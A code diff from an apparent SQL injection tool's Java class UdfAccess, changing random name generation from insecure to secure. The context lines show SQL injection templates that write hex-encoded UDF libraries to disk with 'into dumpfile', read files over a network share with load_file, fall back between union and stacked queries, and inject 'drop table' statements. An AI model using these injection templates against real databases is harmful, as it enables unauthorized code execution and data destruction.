@@ -107,7 +107,7 @@ public class UdfAccess {
             );
         }
         if (StringUtils.isEmpty(isSuccess) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
-            var nameLibraryRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameLibrary;
+            var nameLibraryRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameLibrary;
             this.byTable(UdfAccess.toHexChunks(nameLibrary), pathPlugin + nameLibraryRandom);
             this.biPredConfirm.test(pathPlugin, nameLibraryRandom);
         }
@@ -123,7 +123,7 @@ public class UdfAccess {
         String nameExploitValidated = StringUtils.EMPTY;
         var pattern = " %s SELECT %s 0x%s into dumpfile '%s'";
 
-        var nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
+        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
         this.injectionModel.injectWithoutIndex(String.format(pattern,
             "union",
             "'',".repeat(nbIndexesFound),
@@ -135,7 +135,7 @@ public class UdfAccess {
         }
         if (StringUtils.isEmpty(nameExploitValidated)) {
             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Query body connection failure with union, trying with stack...");
-            nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
+            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
             this.injectionModel.injectWithoutIndex(String.format(pattern,
                 ";",
                 StringUtils.EMPTY,
@@ -161,7 +161,7 @@ public class UdfAccess {
         var pattern = " %s SELECT %s load_file('%s') into dumpfile '%s'";
 
         LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and union...");
-        var nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
+        var nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
         this.injectionModel.injectWithoutIndex(String.format(pattern,
             "union",
             "'',".repeat(nbIndexesFound),
@@ -173,7 +173,7 @@ public class UdfAccess {
         }
         if (StringUtils.isEmpty(nameExploitValidated)) {
             LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Checking connection using netshare and stack...");
-            nameExploitRandom = RandomStringUtils.insecure().nextAlphabetic(8) +"-"+ nameExploit;
+            nameExploitRandom = RandomStringUtils.secure().nextAlphabetic(8) +"-"+ nameExploit;
             this.injectionModel.injectWithoutIndex(String.format(pattern,
                 ";",
                 StringUtils.EMPTY,
@@ -204,7 +204,7 @@ public class UdfAccess {
         if (StringUtils.isEmpty(nameDatabase) || StringUtil.INFORMATION_SCHEMA.equals(nameDatabase)) {
             nameDatabase = "mysql";
         }
-        var nameTableRandom = UdfAccess.NAME_TABLE +"_"+ RandomStringUtils.insecure().nextAlphabetic(8);  // underscore required, dash not allowed
+        var nameTableRandom = UdfAccess.NAME_TABLE +"_"+ RandomStringUtils.secure().nextAlphabetic(8);  // underscore required, dash not allowed
         var nameSchemaTable = nameDatabase +"."+ nameTableRandom;
         this.injectionModel.injectWithoutIndex("; drop table "+ nameSchemaTable, "tbl#tbl");
         var countResult = this.getCountTable(nameDatabase, nameTableRandom);
